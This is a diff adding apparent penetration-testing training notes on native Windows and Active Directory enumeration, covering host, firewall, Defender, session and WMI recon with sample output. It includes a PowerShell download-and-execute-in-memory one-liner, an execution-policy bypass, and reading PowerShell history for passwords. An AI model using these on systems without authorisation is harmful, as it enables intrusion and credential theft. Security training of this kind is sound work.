@@ -5,3 +5,170 @@ that being said these tools are normally much more stealthy than any of the tool
 Scenario
 Let's assume our client has asked us to test their AD environment from a managed host with no internet access, and all efforts to load tools onto it have failed. Our client wants to see what types of enumeration are possible, so we'll have to resort to "living off the land" or only using tools and commands native to Windows/Active Directory. This can also be a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network in previous sections. Most enterprise environments nowadays have some form of network monitoring and logging, including IDS/IPS, firewalls, and passive sensors and tools on top of their host-based defenses such as Windows Defender or enterprise EDR. Depending on the environment, they may also have tools that take a baseline of "normal" network traffic and look for anomalies. Because of this, our chances of getting caught go up exponentially when we start pulling tools into the environment from outside.
 
+Env Commands For Host & Network Recon
+First, we'll cover a few basic environmental commands that can be used to give us more information about the host we are on.
+
+Basic Enumeration Commands
+Command	                                                                Result
+hostname	                                                              Prints the PC's Name
+[System.Environment]::OSVersion.Version	                                Prints out the OS version and revision level
+wmic qfe get Caption,Description,HotFixID,InstalledOn	                  Prints the patches and hotfixes applied to the host
+ipconfig /all	                                                          Prints out network adapter state and configurations
+set	                                                                    Displays a list of environment variables for the current session (ran from CMD-prompt)
+echo %USERDOMAIN%	                                                      Displays the domain name to which the host belongs (ran from CMD-prompt)
+echo %logonserver%	                                                    Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
+
+
+
+Let's look at a few of the ways PowerShell can help us.
+
+Cmd-Let	                                                                                                                      Description
+Get-Module	                                                                                                              Lists available modules loaded for use.
+Get-ExecutionPolicy -List	                                                                                                Will print the execution policy settings for each scope on a host.
+Set-ExecutionPolicy Bypass -Scope Process	                                                                                This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.
+Get-ChildItem Env: | ft Key,Value	                                                                                        Return environment values such as key paths, users, computer information, etc.
+Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt	                                With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"	This is a quick and easy way to download a file from the web using PowerShell and call it from memory.
+
+
+Checking Defenses
+The next few commands utilize the netsh and sc utilities to help us get a feel for the state of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.
+
+Firewall Checks
+
+PS SYNTAX: PS C:\htb> netsh advfirewall show allprofiles
+
+Domain Profile Settings:
+----------------------------------------------------------------------
+State                                 OFF
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (GPO-store only)
+LocalConSecRules                      N/A (GPO-store only)
+InboundUserNotification               Disable
+RemoteManagement                      Disable
+UnicastResponseToMulticast            Enable
+
+Logging:
+LogAllowedConnections                 Disable
+LogDroppedConnections                 Disable
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+Private Profile Settings:
+----------------------------------------------------------------------
+State                                 OFF
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (GPO-store only)
+LocalConSecRules                      N/A (GPO-store only)
+InboundUserNotification               Disable
+RemoteManagement                      Disable
+UnicastResponseToMulticast            Enable
+
+Logging:
+LogAllowedConnections                 Disable
+LogDroppedConnections                 Disable
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+Public Profile Settings:
+----------------------------------------------------------------------
+State                                 OFF
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (GPO-store only)
+LocalConSecRules                      N/A (GPO-store only)
+InboundUserNotification               Disable
+RemoteManagement                      Disable
+UnicastResponseToMulticast            Enable
+
+Logging:
+LogAllowedConnections                 Disable
+LogDroppedConnections                 Disable
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+
+Windows Defender Check (from CMD.exe)
+
+CMD SYNTAX: C:\htb> sc query windefend
+
+SERVICE_NAME: windefend
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+Get-MpComputerStatus
+
+PS SYNTAX: PS C:\htb> Get-MpComputerStatus
+
+AMEngineVersion                  : 1.1.19000.8
+AMProductVersion                 : 4.18.2202.4
+AMRunningMode                    : Normal
+AMServiceEnabled                 : True
+AMServiceVersion                 : 4.18.2202.4
+AntispywareEnabled               : True
+AntispywareSignatureAge          : 0
+AntispywareSignatureLastUpdated  : 3/21/2022 4:06:15 AM
+AntispywareSignatureVersion      : 1.361.414.0
+AntivirusEnabled                 : True
+AntivirusSignatureAge            : 0
+AntivirusSignatureLastUpdated    : 3/21/2022 4:06:16 AM
+AntivirusSignatureVersion        : 1.361.414.0
+BehaviorMonitorEnabled           : True
+ComputerID                       : FDA97E38-1666-4534-98D4-943A9A871482
+ComputerState                    : 0
+DefenderSignaturesOutOfDate      : False
+DeviceControlDefaultEnforcement  : Unknown
+DeviceControlPoliciesLastUpdated : 3/20/2022 9:08:34 PM
+DeviceControlState               : Disabled
+FullScanAge                      : 4294967295
+FullScanEndTime                  :
+FullScanOverdue                  : False
+FullScanRequired                 : False
+FullScanSignatureVersion         :
+FullScanStartTime                :
+IoavProtectionEnabled            : True
+IsTamperProtected                : True
+IsVirtualMachine                 : False
+LastFullScanSource               : 0
+LastQuickScanSource              : 2
+
+<SNIP>
+
+
+Am I Alone?
+When landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.
+
+qwisnta 
+
+PS SYNTAX: PS C:\htb> qwinsta
+
+ SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
+ services                                    0  Disc
+>console           forend                    1  Active
+ rdp-tcp                                 65536  Listen
+
+Network Information
+Networking Commands	                                      Description
+arp -a	                                                  Lists all known hosts stored in the arp table.
+ipconfig /all	                                            Prints out adapter settings for the host. We can figure out the network segment from here.
+route print	                                              Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.
+netsh advfirewall show allprofiles	                      Displays the status of the host's firewall. We can determine if it is active and filtering traffic.
+
+
+Windows Management Instrumentation (WMI)
+Windows Management Instrumentation (WMI) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. For our usage, we will create a WMI report on domain users, groups, processes, and other information from our host and other domain hosts.
+
+Quick WMI checks
+Command	                                                                                  Description
+wmic qfe get Caption,Description,HotFixID,InstalledOn	                                    Prints the patch level and description of the Hotfixes applied
+wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List	      Displays basic host information to include any attributes within the list
+wmic process list /format:list	                                                          A listing of all processes on host
+wmic ntdomain list /format:list	                                                          Displays information about the Domain and Domain Controllers
+wmic useraccount list /format:list	                                                      Displays information about all local accounts and any domain accounts that have logged into the device
+wmic group list /format:list	                                                            Information about all local groups
+wmic sysaccount list /format:list	                                                        Dumps information about any system accounts that are being used as service accounts.
+
